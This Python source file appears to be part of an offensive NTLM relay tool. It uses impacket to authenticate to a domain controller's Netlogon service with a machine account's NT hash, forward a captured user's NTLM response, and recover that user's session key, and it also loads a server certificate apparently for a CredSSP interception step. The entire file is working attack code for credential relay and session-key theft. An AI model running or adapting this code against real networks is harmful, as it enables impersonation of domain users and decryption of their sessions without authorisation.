from TSDecode import *
from NTLMStruct import *
from keyManagement import *
import socket
import sys
import ssl
import time
import hashlib
import argparse
from OpenSSL import crypto
from struct import pack, unpack
from binascii import unhexlify, hexlify
from impacket.spnego import *
from impacket.examples import logger
from impacket.ntlm import *
from impacket.structure import Structure
from impacket.spnego import GSSAPI, ASN1_SEQUENCE, ASN1_OCTET_STRING, asn1decode, asn1encode
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException

def getSessionKey(computer, domain, domainIP, hashes, serverName, authMessage) :

    print ("Connecting to NETLOGON service : Authenticating Server")
    stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % domainIP
    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    ntHash = unhexlify(hashes.split(':')[1])
    rpctransport.set_credentials(computer,"",domain,"",ntHash)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName +"\x00",'12345678')
    serverChallenge = resp['ServerChallenge']
    sessionKey = nrpc.ComputeSessionKeyStrongKey('','12345678',serverChallenge, ntHash)
    ppp = nrpc.ComputeNetlogonCredential('12345678',sessionKey)
    nrpc.hNetrServerAuthenticate3(dce, NULL, computer+"\x00",nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00', ppp, 0x600FFFFF)
    clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)

    #SamLogonWithFlags
    print "Forwarding NTLM Response to DC"
    request = nrpc.NetrLogonSamLogonWithFlags()
    request['LogonServer'] = '\x00'
    request['ComputerName'] = serverName + '\x00'
    request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
    request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
    request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
    request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName']  = authMessage['domain_name'].decode('utf-16le')
    request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
    request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authMessage['user_name'].decode('utf-16le')
    request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
    request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = 'AAAAAAAA' #challenge
    request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authMessage['ntlm']
    request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authMessage['lanman']
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
    authenticator['Timestamp'] = 10
    request['Authenticator'] = authenticator
    request['ReturnAuthenticator']['Credential'] = '\x00'*8
    request['ReturnAuthenticator']['Timestamp'] = 0
    request['ExtraFlags'] = 0
    resp = dce.request(request)
    encryptedSessionKey = authMessage['session_key']
    sessionKey = generateEncryptedSessionKey(resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
    print "Retrieving Session Key from DC"
    return sessionKey

def getPubKey():

    cert = open("./server.crt",'r')
    crt = crypto.load_certificate(crypto.FILETYPE_PEM,cert.read())
    pubkeyObj = crt.get_pubkey()
    pubkeyStr = crypto.dump_privatekey(crypto.FILETYPE_ASN1,pubkeyObj)
    pubkeyStr = pubkeyStr[7:]
    pubkeyStr = b'\x30' + asn1encode(pubkeyStr)

    return pubkeyStr


